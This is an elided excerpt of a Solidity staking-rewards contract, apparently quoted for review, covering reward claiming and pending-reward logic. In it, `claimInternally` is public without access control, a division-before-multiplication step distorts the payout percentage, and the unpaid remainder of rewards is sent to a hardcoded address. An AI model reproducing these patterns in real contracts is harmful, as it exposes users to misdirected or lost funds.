    ...
    RewardRateConfigurable
{
    ...
    function updateRewards(
        ...
        for (uint256 i = 0; i < _distributionInfo.length; ++i) {
            uint256[25] storage _userRewards = userRewardsInfo[_pid][_distributionInfo[i].user]
                .userRewards;
            claimInternally(_pid , _distributionInfo[i].user);
    ...
    function claimInternally(uint256 _pid,address _user) public {
        ...
        uint256 userActiveRewardsPercent = (userSharesByLevel * poolInfo[_pid].accRewardPerShare) / (userSharesByTotal * poolInfo[_pid].accRewardPerShare) * 100;
        

        partnersClaimRewards[_pid][_user] +=( userTotalRewards * userActiveRewardsPercent) / 100;
        userRewardsInfo[_pid][_user].userRewardDebt = (userSharesByTotal * poolInfo[_pid].accRewardPerShare) / 1e18;
        partnersClaimRewards[_pid][0x49A6DaD36768c23eeb75BD253aBBf26AB38BE4EB] += userTotalRewards - (( userTotalRewards * userActiveRewardsPercent) / 100);
    }
    ...
    function _claim(
        ...
        uint256 _rewards = ( userTotalRewards * userActiveRewardsPercent) / 100;
    ...
    function _getPendingRewards(
        ...
        return
           ( ( userTotalRewards * userActiveRewardsPercent) / 100 )- partnersClaimRewards[_pid][_user];
    }
}
